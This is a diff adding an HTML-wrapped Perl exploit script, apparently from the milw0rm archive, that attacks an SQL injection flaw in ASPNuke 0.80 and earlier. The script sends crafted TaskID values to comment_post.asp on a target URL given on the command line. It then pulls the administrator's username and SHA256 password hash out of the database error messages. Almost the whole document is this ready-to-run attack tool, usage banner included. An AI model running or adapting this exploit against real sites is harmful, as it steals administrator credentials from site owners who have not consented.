@@ -1,0 +1,35 @@
+<html>
+<head>
+<title>ASPNuke <= 0.80 (comment_post.asp) SQL Injection Exploit</title>
+<pre>
+#!/usr/bin/perl -w
+#
+# SQL Injection Exploit for ASPNuke &lt;= 0.80
+# This exploit retrieve the username of the administrator of the board and his password crypted in SHA256
+# Related advisory: http://www.securityfocus.com/archive/1/403479/30/0/threaded
+# Discovered and Coded by Alberto Trivero
+
+use LWP::Simple;
+
+print &quot;\n\t===============================\n&quot;;
+print &quot;\t= Exploit for ASPNuke &lt;= 0.80 =\n&quot;;
+print &quot;\t=     by Alberto Trivero      =\n&quot;;
+print &quot;\t===============================\n\n&quot;;
+
+if(@ARGV!=1 or !($ARGV[0]=~m/http/)) {
+   print &quot;Usage:\nperl $0 [full_target_path]\n\nExamples:\nperl $0 http://www.example.com/aspnuke/\n&quot;;
+   exit(0);
+}
+
+$page=get($ARGV[0].&quot;module/support/task/comment_post.asp?TaskID=Username&quot;) || die &quot;[-] Unable to retrieve: $!&quot;;
+print &quot;[+] Connected to: $ARGV[0]\n&quot;;
+$page=~m/the varchar value '(.*?)' to a column/ &amp;&amp; print &quot;[+] Username of admin is: $1\n&quot;;
+print &quot;[-] Unable to retrieve Username\n&quot; if(!$1);
+$page=get($ARGV[0].&quot;module/support/task/comment_post.asp?TaskID=Password&quot;) || die &quot;[-] Unable to retrieve: $!&quot;;
+$page=~m/the varchar value '(.*?)' to a column/ &amp;&amp; print &quot;[+] SHA256 hash of password is: $1\n&quot;;
+print &quot;[-] Unable to retrieve hash of password\n&quot; if(!$1);
+
+# milw0rm.com [2005-06-27]
+</pre>
+</html>
+
